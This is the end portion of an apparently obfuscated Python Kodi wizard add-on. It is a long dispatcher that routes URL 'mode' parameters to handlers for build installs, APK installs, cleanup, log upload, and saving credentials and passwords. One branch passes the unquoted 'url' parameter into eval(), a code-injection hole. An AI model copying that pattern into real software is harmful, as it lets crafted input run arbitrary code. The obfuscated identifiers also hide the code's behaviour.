						for O000000O00OOOOO0O in O000O0O0O0OO00OOO :#line:5605
							shutil .rmtree (os .path .join (OO0OO0O00000O00O0 ,O000000O00OOOOO0O ))#line:5606
					os .rmdir (O00OO0OO00OO00O0O )#line:5607
	except :pass #line:5609
params =get_params ()#line:5610
url =None #line:5611
name =None #line:5612
mode =None #line:5613
try :mode =urllib .unquote_plus (params ["mode"])#line:5615
except :pass #line:5616
try :name =urllib .unquote_plus (params ["name"])#line:5617
except :pass #line:5618
try :url =urllib .unquote_plus (params ["url"])#line:5619
except :pass #line:5620
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5622
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5623
def setView (OOO0000O00O00OO0O ,OOOO00000O0O00OO0 ):#line:5624
	if wiz .getS ('auto-view')=='true':#line:5625
		OOOOOO000OOO00O00 =wiz .getS (OOOO00000O0O00OO0 )#line:5626
		if OOOOOO000OOO00O00 =='50'and KODIV >=17 and SKIN =='skin.estuary':OOOOOO000OOO00O00 ='55'#line:5627
		if OOOOOO000OOO00O00 =='500'and KODIV >=17 and SKIN =='skin.estuary':OOOOOO000OOO00O00 ='50'#line:5628
		wiz .ebi ("Container.SetViewMode(%s)"%OOOOOO000OOO00O00 )#line:5629
if mode ==None :index ()#line:5631
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5633
elif mode =='builds':buildMenu ()#line:5634
elif mode =='viewbuild':viewBuild (name )#line:5635
elif mode =='buildinfo':buildInfo (name )#line:5636
elif mode =='buildpreview':buildVideo (name )#line:5637
elif mode =='install':buildWizard (name ,url )#line:5638
elif mode =='theme':buildWizard (name ,mode ,url )#line:5639
elif mode =='viewthirdparty':viewThirdList (name )#line:5640
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5641
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5642
elif mode =='maint':maintMenu (name )#line:5644
elif mode =='passpin':passandpin ()#line:5645
elif mode =='backmyupbuild':backmyupbuild ()#line:5646
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5647
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5648
elif mode =='advancedsetting':advancedWindow (name )#line:5649
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5650
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5651
elif mode =='asciicheck':wiz .asciiCheck ()#line:5652
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5653
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5654
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5655
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5656
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5657
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5658
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5659
elif mode =='currentsettings':viewAdvanced ()#line:5660
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5661
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5662
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5663
elif mode =='fixskin':backtokodi ()#line:5664
elif mode =='testcommand':testcommand ()#line:5665
elif mode =='logsend':logsend ()#line:5666
elif mode =='rdon':rdon ()#line:5667
elif mode =='rdoff':rdoff ()#line:5668
elif mode =='setrd':setrealdebrid ()#line:5669
elif mode =='setrd2':setautorealdebrid ()#line:5670
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5671
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5672
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5673
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5674
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5675
elif mode =='freshstart':freshStart ()#line:5676
elif mode =='forceupdate':wiz .forceUpdate ()#line:5677
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5678
elif mode =='forceclose':wiz .killxbmc ()#line:5679
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5680
elif mode =='hidepassword':wiz .hidePassword ()#line:5681
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5682
elif mode =='enableaddons':enableAddons ()#line:5683
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5684
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5685
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5686
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5687
elif mode =='uploadlog':uploadLog .Main ()#line:5688
elif mode =='viewlog':LogViewer ()#line:5689
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5690
elif mode =='viewerrorlog':errorChecking (all =True )#line:5691
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5692
elif mode =='purgedb':purgeDb ()#line:5693
elif mode =='fixaddonupdate':fixUpdate ()#line:5694
elif mode =='removeaddons':removeAddonMenu ()#line:5695
elif mode =='removeaddon':removeAddon (name )#line:5696
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5697
elif mode =='removedata':removeAddonData (name )#line:5698
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5699
elif mode =='systeminfo':systemInfo ()#line:5700
elif mode =='restorezip':restoreit ('build')#line:5701
elif mode =='restoregui':restoreit ('gui')#line:5702
elif mode =='restoreaddon':restoreit ('addondata')#line:5703
elif mode =='restoreextzip':restoreextit ('build')#line:5704
elif mode =='restoreextgui':restoreextit ('gui')#line:5705
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5706
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5707
elif mode =='traktsync':traktsync ()#line:5708
elif mode =='apk':apkMenu (name )#line:5710
elif mode =='apkscrape':apkScraper (name )#line:5711
elif mode =='apkinstall':apkInstaller (name ,url )#line:5712
elif mode =='speed':speedMenu ()#line:5713
elif mode =='net':net_tools ()#line:5714
elif mode =='GetList':GetList (url )#line:5715
elif mode =='youtube':youtubeMenu (name )#line:5716
elif mode =='viewVideo':playVideo (url )#line:5717
elif mode =='addons':addonMenu (name )#line:5719
elif mode =='addoninstall':addonInstaller (name ,url )#line:5720
elif mode =='savedata':saveMenu ()#line:5722
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5723
elif mode =='managedata':manageSaveData (name )#line:5724
elif mode =='whitelist':wiz .whiteList (name )#line:5725
elif mode =='trakt':traktMenu ()#line:5727
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5728
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5729
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5730
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5731
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5732
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5733
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5734
elif mode =='realdebrid':realMenu ()#line:5736
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5737
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5738
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5739
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5740
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5741
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5742
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5743
elif mode =='login':loginMenu ()#line:5745
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5746
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5747
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5748
elif mode =='clearlogin':loginit .clearSaved (name )#line:5749
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5750
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5751
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5752
elif mode =='contact':notify .contact (CONTACT )#line:5754
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5755
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5756
elif mode =='developer':developer ()#line:5758
elif mode =='converttext':wiz .convertText ()#line:5759
elif mode =='createqr':wiz .createQR ()#line:5760
elif mode =='testnotify':testnotify ()#line:5761
elif mode =='testnotify2':testnotify2 ()#line:5762
elif mode =='servicemanual':servicemanual ()#line:5763
elif mode =='fastinstall':fastinstall ()#line:5764
elif mode =='testupdate':testupdate ()#line:5765
elif mode =='testfirst':testfirst ()#line:5766
elif mode =='testfirstrun':testfirstRun ()#line:5767
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5768
elif mode =='bg':wiz .bg_install (name ,url )#line:5770
elif mode =='bgcustom':wiz .bg_custom ()#line:5771
elif mode =='bgremove':wiz .bg_remove ()#line:5772
elif mode =='bgdefault':wiz .bg_default ()#line:5773
elif mode =='rdset':rdsetup ()#line:5774
elif mode =='mor':morsetup ()#line:5775
elif mode =='mor2':morsetup2 ()#line:5776
elif mode =='resolveurl':resolveurlsetup ()#line:5777
elif mode =='urlresolver':urlresolversetup ()#line:5778
elif mode =='forcefastupdate':forcefastupdate ()#line:5779
elif mode =='traktset':traktsetup ()#line:5780
elif mode =='placentaset':placentasetup ()#line:5781
elif mode =='flixnetset':flixnetsetup ()#line:5782
elif mode =='reptiliaset':reptiliasetup ()#line:5783
elif mode =='yodasset':yodasetup ()#line:5784
elif mode =='numbersset':numberssetup ()#line:5785
elif mode =='uranusset':uranussetup ()#line:5786
elif mode =='genesisset':genesissetup ()#line:5787
elif mode =='fastupdate':fastupdate ()#line:5788
elif mode =='folderback':folderback ()#line:5789
elif mode =='menudata':Menu ()#line:5790
elif mode ==2 :#line:5792
        wiz .torent_menu ()#line:5793
elif mode ==3 :#line:5794
        wiz .popcorn_menu ()#line:5795
elif mode ==8 :#line:5796
        wiz .metaliq_fix ()#line:5797
elif mode ==9 :#line:5798
        wiz .quasar_menu ()#line:5799
elif mode ==5 :#line:5800
        swapSkins ('skin.Premium.mod')#line:5801
elif mode ==13 :#line:5802
        wiz .elementum_menu ()#line:5803
elif mode ==16 :#line:5804
        wiz .fix_wizard ()#line:5805
elif mode ==17 :#line:5806
        wiz .last_play ()#line:5807
elif mode ==18 :#line:5808
        wiz .normal_metalliq ()#line:5809
elif mode ==19 :#line:5810
        wiz .fast_metalliq ()#line:5811
elif mode ==20 :#line:5812
        wiz .fix_buffer2 ()#line:5813
elif mode ==21 :#line:5814
        wiz .fix_buffer3 ()#line:5815
elif mode ==11 :#line:5816
        wiz .fix_buffer ()#line:5817
elif mode ==15 :#line:5818
        wiz .fix_font ()#line:5819
elif mode ==14 :#line:5820
        wiz .clean_pass ()#line:5821
elif mode ==22 :#line:5822
        wiz .movie_update ()#line:5823
elif mode =='adv_settings':buffer1 ()#line:5824
elif mode =='getpass':getpass ()#line:5825
elif mode =='setpass':setpass ()#line:5826
elif mode =='setuname':setuname ()#line:5827
elif mode =='passandUsername':passandUsername ()#line:5828
elif mode =='9':disply_hwr ()#line:5829
elif mode =='99':disply_hwr2 ()#line:5830
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))